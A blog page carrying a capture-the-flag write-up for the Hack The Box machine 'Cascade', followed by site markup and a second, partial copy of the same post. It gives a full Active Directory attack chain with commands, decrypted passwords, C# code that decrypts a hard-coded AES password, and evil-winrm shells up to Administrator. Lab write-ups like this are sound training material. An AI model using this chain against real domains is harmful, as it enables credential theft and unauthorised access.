cascade.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 $ nmap -sV -sT -sC cascade.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 04:22 EDT Nmap scan report for cascade.htb (10.10.10.182) Host is up (0.18s latency). Not shown: 987 filtered ports PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-04-10 08:25:23Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: |_clock-skew: 2m52s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-04-10T08:26:15 |_ start_date: 2020-04-10T07:50:40 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 227.43 seconds Enumeration (1) Seeing that the box belongs to the cascade.local domain, we will append it to our /etc/hosts. 1 2 3 $ cat /etc/hosts ... 10.10.10.182 cascade.htb cascade.local Seeing that ldap service is running on port 389, we will use ldapsearch. 1 2 3 $ ldapsearch -x -h cascade.local -b &quot;dc=cascade,dc=local&quot; ... cascadeLegacyPwd: clk0bjVldmE= After eye-balling for a while, I saw a peculiar “cascadeLegacyPwd” which seems to be in `base64. Decoding it reveals “rY4n5eva” This field was under a user called “r.thompson”. Perhaps this password is still being in used? We can use the smb service to verify. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 $ smbmap -H cascade.local -d cascade.local -u r.thompson -p rY4n5eva [+] Finding open SMB ports.... [+] User SMB session established on cascade.local... [+] IP: cascade.local:445 Name: unknown Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin Audit$ NO ACCESS C$ NO ACCESS Default share . dr--r--r-- 0 Tue Jan 28 17:05:51 2020 . dr--r--r-- 0 Tue Jan 28 17:05:51 2020 .. dr--r--r-- 0 Sun Jan 12 20:45:14 2020 Contractors dr--r--r-- 0 Sun Jan 12 20:45:10 2020 Finance dr--r--r-- 0 Tue Jan 28 13:04:51 2020 IT dr--r--r-- 0 Sun Jan 12 20:45:20 2020 Production dr--r--r-- 0 Sun Jan 12 20:45:16 2020 Temps Data READ ONLY IPC$ NO ACCESS Remote IPC . dr--r--r-- 0 Wed Jan 15 16:50:33 2020 . dr--r--r-- 0 Wed Jan 15 16:50:33 2020 .. fr--r--r-- 258 Wed Jan 15 16:50:14 2020 MapAuditDrive.vbs fr--r--r-- 255 Wed Jan 15 16:51:03 2020 MapDataDrive.vbs NETLOGON READ ONLY Logon server share . dr--r--r-- 0 Thu Jan 9 18:06:29 2020 . dr--r--r-- 0 Thu Jan 9 18:06:29 2020 .. dr--r--r-- 0 Thu Jan 9 18:06:29 2020 color dr--r--r-- 0 Thu Jan 9 18:06:29 2020 IA64 dr--r--r-- 0 Thu Jan 9 18:06:29 2020 W32X86 dr--r--r-- 0 Sun Jan 12 22:09:11 2020 x64 print$ READ ONLY Printer Drivers . dr--r--r-- 0 Thu Jan 9 10:31:27 2020 . dr--r--r-- 0 Thu Jan 9 10:31:27 2020 .. dr--r--r-- 0 Thu Jan 9 10:31:27 2020 cascade.local SYSVOL READ ONLY Logon server share As r.thompson, we are only able to read from Data, NETLOGON, print$ and SYSVOL. Time to start digging around! 1 2 3 4 5 6 7 8 9 10 11 12 $ smbclient //cascade.local/Data -U r.thompson Enter WORKGROUP\\r.thompson&#39;s password: Try &quot;help&quot; to get a list of possible commands. ... smb: \\IT\\Temp\\s.smith\\&gt; dir . D 0 Tue Jan 28 15:00:01 2020 .. D 0 Tue Jan 28 15:00:01 2020 VNC Install.reg A 2680 Tue Jan 28 14:27:44 2020 13106687 blocks of size 4096. 7792770 blocks available smb: \\IT\\Temp\\s.smith\\&gt; get &quot;VNC Install.reg&quot; getting file \\IT\\Temp\\s.smith\\VNC Install.reg of size 2680 as VNC Install.reg (4.1 KiloBytes/sec) (average 4.1 KiloBytes/sec) In \\IT\\Temp\\s.smith\\ was a file called VNC Install.reg. After downloading and reading it, we see something interesting. 1 2 3 $ cat &quot;VNC Install.reg&quot; ... &quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f This password can be decoded by using msfconsole. 1 2 3 4 5 6 7 8 9 10 $ msfconsole msf5 &gt; irb [*] Starting IRB shell... [*] You are in the &quot;framework&quot; object &gt;&gt; fixedkey = &quot;\\x17\\x52\\x6b\\x06\\x23\\x4e\\x58\\x07&quot; =&gt; &quot;\\u0017Rk\\u0006#NX\\a&quot; &gt;&gt; require &#39;rex/proto/rfb&#39; =&gt; true &gt;&gt; Rex::Proto::RFB::Cipher.decrypt [&quot;6BCF2A4B6E5ACA0F&quot;].pack(&#39;H*&#39;), fixedkey =&gt; &quot;sT333ve2&quot; Since the file was found in a directory belonging s.smith, we assume that this is his password. Lets test it out. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ smbmap -H cascade.local -d cascade.local -u s.smith -p sT333ve2 [+] Finding open SMB ports.... [+] User SMB session established on cascade.local... [+] IP: cascade.local:445 Name: unknown Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin . dr--r--r-- 0 Wed Jan 29 13:01:26 2020 . dr--r--r-- 0 Wed Jan 29 13:01:26 2020 .. fr--r--r-- 13312 Tue Jan 28 16:47:08 2020 CascAudit.exe fr--r--r-- 12288 Wed Jan 29 13:01:26 2020 CascCrypto.dll dr--r--r-- 0 Tue Jan 28 16:43:18 2020 DB fr--r--r-- 45 Tue Jan 28 18:29:47 2020 RunAudit.bat fr--r--r-- 363520 Tue Jan 28 15:42:18 2020 System.Data.SQLite.dll fr--r--r-- 186880 Tue Jan 28 15:42:18 2020 System.Data.SQLite.EF6.dll dr--r--r-- 0 Tue Jan 28 15:42:18 2020 x64 dr--r--r-- 0 Tue Jan 28 15:42:18 2020 x86 Audit$ READ ONLY ... Using s.smith, we now have access to an additional share Audit$. Wait, we haven’t found user.txt? user.txt Running a second nmap scan but with all ports reveals an additional service we can use: winrm on port 5985. Using evil-winrm, 1 2 3 4 5 6 7 $ ruby evil-winrm.rb -i cascade.local -u s.smith -p sT333ve2 Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\s.smith\\Documents&gt; type ../Desktop/user.txt 003fXXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) Back to the Audit$ share, there were quite a few interesting files. After downloading all the files, I first checked out \\DB\\Audit.db. 1 2 $ file Audit.db Audit.db: SQLite 3.x database, last written using SQLite version 3027002 Fortunately, Kali Linux comes pre-installed with a SQLite Database browser. After loading Audit.db into the browser, you should see 4 tables. There were mainly 2 interesting tables: DeletedUserAudit: Ldap: It seems like we found a username ArkSvc and its password which appears to be in base64. However, decoding it doesn’t return any readable password. :( The next file I checked was RunAudit.bat. 1 2 $ cat RunAudit.bat CascAudit.exe &quot;\\\\CASC-DC1\\Audit$\\DB\\Audit.db&quot; Hmm… This batch script is runnig CascAudit.exe and using Audit.db as a command line argument. Perhaps it is writing/reading from it? Lets check out CascAudit.exe next. 1 2 $ file CascAudit.exe CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows Fortunately, it was written in .NET, meaning we can decompile it to obtain its original source code! I will be transferring CascAudit.exe to my FlareVM, which has ILSpy installed. CascAudit.exe: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ... sQLiteConnection.Open(); SQLiteCommand sQLiteCommand = new SQLiteCommand(&quot;SELECT * FROM LDAP&quot;, sQLiteConnection); try { SQLiteDataReader sQLiteDataReader = sQLiteCommand.ExecuteReader(); try { sQLiteDataReader.Read(); str = Conversions.ToString(sQLiteDataReader[&quot;Uname&quot;]); str2 = Conversions.ToString(sQLiteDataReader[&quot;Domain&quot;]); string encryptedString = Conversions.ToString(sQLiteDataReader[&quot;Pwd&quot;]); try { password = Crypto.DecryptString(encryptedString, &quot;c4scadek3y654321&quot;); } catch (Exception ex) { ProjectData.SetProjectError(ex); Exception ex2 = ex; Console.WriteLine(&quot;Error decrypting password: &quot; + ex2.Message); ProjectData.ClearProjectError(); return; } } ... In this code segment, it is attempting to select records from the LDAP table and decrypt the encrypted string in the “Pwd” column with a hard-coded key c4scadek3y654321. The decrypt function used was from a custom class called Crypto, which was in another file in the Audit$ share called CascCrypto.dll. Opening it up with ILSpy, CascCrypto.dll: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 public class Crypto { public const string DefaultIV = &quot;1tdyjCbY1Ix49842&quot;; public const int Keysize = 128; public static string EncryptString(string Plaintext, string Key) { byte[] bytes = Encoding.UTF8.GetBytes(Plaintext); Aes aes = Aes.Create(); aes.BlockSize = 128; aes.KeySize = 128; aes.IV = Encoding.UTF8.GetBytes(&quot;1tdyjCbY1Ix49842&quot;); aes.Key = Encoding.UTF8.GetBytes(Key); aes.Mode = CipherMode.CBC; using (MemoryStream memoryStream = new MemoryStream()) { using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write)) { cryptoStream.Write(bytes, 0, bytes.Length); cryptoStream.FlushFinalBlock(); } return Convert.ToBase64String(memoryStream.ToArray()); } } public static string DecryptString(string EncryptedString, string Key) { //Discarded unreachable code: IL_009e byte[] array = Convert.FromBase64String(EncryptedString); Aes aes = Aes.Create(); aes.KeySize = 128; aes.BlockSize = 128; aes.IV = Encoding.UTF8.GetBytes(&quot;1tdyjCbY1Ix49842&quot;); aes.Mode = CipherMode.CBC; aes.Key = Encoding.UTF8.GetBytes(Key); using (MemoryStream stream = new MemoryStream(array)) { using (CryptoStream cryptoStream = new CryptoStream(stream, aes.CreateDecryptor(), CryptoStreamMode.Read)) { byte[] array2 = new byte[checked(array.Length - 1 + 1)]; cryptoStream.Read(array2, 0, array2.Length); return Encoding.UTF8.GetString(array2); } } } } To decrypt the encrypted password in the Audit.db, we can simply just make use of the DecryptString method that was already implemented for us. I am not well-versed on how to setup an environment for .NET but I know there are websites like this that allows you run any .NET code ! :) This is how my final code looks like: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 using System; using System.IO; using System.Security.Cryptography; using System.Text; public class Program { public static string DecryptString(string EncryptedString, string Key) { //Discarded unreachable code: IL_009e byte[] array = Convert.FromBase64String(EncryptedString); Aes aes = Aes.Create(); aes.KeySize = 128; aes.BlockSize = 128; aes.IV = Encoding.UTF8.GetBytes(&quot;1tdyjCbY1Ix49842&quot;); aes.Mode = CipherMode.CBC; aes.Key = Encoding.UTF8.GetBytes(Key); using (MemoryStream stream = new MemoryStream(array)) { using (CryptoStream cryptoStream = new CryptoStream(stream, aes.CreateDecryptor(), CryptoStreamMode.Read)) { byte[] array2 = new byte[checked(array.Length - 1 + 1)]; cryptoStream.Read(array2, 0, array2.Length); return Encoding.UTF8.GetString(array2); } } } public static void Main() { Console.WriteLine(DecryptString(&quot;BQO5l5Kj9MdErXx6Q6AGOw==&quot;, &quot;c4scadek3y654321&quot;)); } } After executing, we get the output w3lc0meFr31nd. Using evil-winrm again, we establish a shell as ArkSvc. 1 2 3 4 5 6 7 $ ruby evil-winrm.rb -i cascade.local -u ArkSvc -p w3lc0meFr31nd Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\arksvc\\Documents&gt; Going back to the Data share, there was a file Meeting_Notes_June_2018.html in \\IT\\Email Archives\\: 1 2 3 4 5 6 ... &lt;p&gt;-- We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). &lt;/p&gt; ... Hmm… If we can somehow recover TempAdmin, we might be able to get the password of the Administrator account! Lets see if we can retrieve information about deleted objects! 1 2 3 4 5 6 7 8 9 10 *Evil-WinRM* PS C:\\Users\\arksvc\\Documents&gt; Get-ADObject -filter &#39;isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&#39; -includeDeletedObjects -properties * ... accountExpires : 9223372036854775807 badPasswordTime : 0 badPwdCount : 0 CanonicalName : cascade.local/Deleted Objects/TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz CN : TempAdmin ... Like r.thompson, TempAdmin had a cascadeLegacyPwd, which is baCT3r1aN00dles when decoded! root.txt Using evil-winrm for the final time, we finally get our flag! 1 2 3 4 5 6 7 $ ruby evil-winrm.rb -i cascade.local -u Administrator -p baCT3r1aN00dles Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; type ../Desktop/root.txt f9f8XXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !","url":"https://rizemon.github.io/posts/cascade-htb/","@type":"BlogPosting","headline":"Hack The Box - Cascade","dateModified":"2021-01-03T20:34:47+08:00","datePublished":"2020-07-26T13:28:00+08:00","@context":"https://schema.org"}</script><title>Hack The Box - Cascade | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">rizemon's blog</a></div><div class="site-subtitle font-italic">Cyber Security Enthusiast.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Cascade</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Cascade</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Jul 26, 2020, 1:28 PM +0800" > Jul 26, 2020 <i class="unloaded">2020-07-26T13:28:00+08:00</i> </span> by <span class="author"> rizemon </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 3, 2021, 8:34 PM +0800" > Jan 3, 2021 <i class="unloaded">2021-01-03T20:34:47+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2064 words">11 min</span></div></div><div class="post-content"><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cascade.png" alt="" height="414px" width="615px" /></p><h1 id="configuration">Configuration</h1><p>The operating systems that I will be using to tackle this machine is a Kali Linux VM and a FlareVM.</p><p>What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.182 cascade.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
</pre></table></code></div></div><h1 id="reconnaissance">Reconnaissance</h1><p>Using <code class="language-plaintext highlighter-rouge">nmap</code>, we are able to determine the open ports and running services on the machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sT</span> <span class="nt">-sC</span> cascade.htb
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-04-10 04:22 EDT
Nmap scan report <span class="k">for </span>cascade.htb <span class="o">(</span>10.10.10.182<span class="o">)</span>
Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 987 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span> <span class="o">(</span>Windows Server 2008 R2 SP1<span class="o">)</span>
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span>
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2020-04-10 08:25:23Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span class="o">)</span>
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2m52s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   <span class="nb">date</span>: 2020-04-10T08:26:15
|_  start_date: 2020-04-10T07:50:40

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>227.43 seconds

</pre></table></code></div></div><h1 id="enumeration-1">Enumeration (1)</h1><p>Seeing that the box belongs to the <code class="language-plaintext highlighter-rouge">cascade.local</code> domain, we will append it to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> /etc/hosts
...
10.10.10.182 cascade.htb cascade.local
</pre></table></code></div></div><p>Seeing that <code class="language-plaintext highlighter-rouge">ldap</code> service is running on port <code class="language-plaintext highlighter-rouge">389</code>, we will use <code class="language-plaintext highlighter-rouge">ldapsearch</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> cascade.local <span class="nt">-b</span> <span class="s2">"dc=cascade,dc=local"</span>
...
cascadeLegacyPwd: <span class="nv">clk0bjVldmE</span><span class="o">=</span>
</pre></table></code></div></div><p>After eye-balling for a while, I saw a peculiar “cascadeLegacyPwd” which seems to be in `base64. Decoding it reveals “rY4n5eva”</p><p>This field was under a user called “r.thompson”. Perhaps this password is still being in used? We can use the <code class="language-plaintext highlighter-rouge">smb</code> service to verify.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre><span class="nv">$ </span>smbmap <span class="nt">-H</span> cascade.local <span class="nt">-d</span> cascade.local <span class="nt">-u</span> r.thompson <span class="nt">-p</span> rY4n5eva
<span class="o">[</span>+] Finding open SMB ports....
<span class="o">[</span>+] User SMB session established on cascade.local...
<span class="o">[</span>+] IP: cascade.local:445       Name: unknown                                           
        Disk                                                    Permissions     Comment
        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
        ADMIN<span class="nv">$ </span>                                                 NO ACCESS       Remote Admin
        Audit<span class="nv">$ </span>                                                 NO ACCESS
        C<span class="nv">$ </span>                                                     NO ACCESS       Default share
        <span class="nb">.</span>                                                  
        dr--r--r--                0 Tue Jan 28 17:05:51 2020    <span class="nb">.</span>
        dr--r--r--                0 Tue Jan 28 17:05:51 2020    ..
